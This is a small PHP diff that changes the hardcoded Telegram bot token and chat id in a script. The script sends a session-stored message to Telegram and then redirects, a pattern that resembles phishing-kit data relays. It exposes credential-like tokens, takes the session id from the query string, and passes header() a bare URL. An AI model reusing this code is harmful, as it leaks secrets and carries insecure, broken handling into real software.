@@ -1,8 +1,8 @@
 <?php
     session_id($_GET['sid']);
     session_start();
-    $bot_token = '6709733374:AAFTaE2fVG_7bao74d86-SEbfnj8YsUsrtA';
-    $chat_id = '6387301321';
+    $bot_token = '8423218644:AAHAwHQYgiG8PyQI3rbfdeZo7rO5vrTLs5g';
+    $chat_id = '1235164358';
     $return_url = $_SESSION['returnUrl'];
     $message = $_SESSION['msg'];
     $url = "https://api.telegram.org/bot$bot_token/sendMessage";
@@ -24,4 +24,5 @@
     
     $response = file_get_contents($url, false, $context);
     header($return_url);
+
 ?>
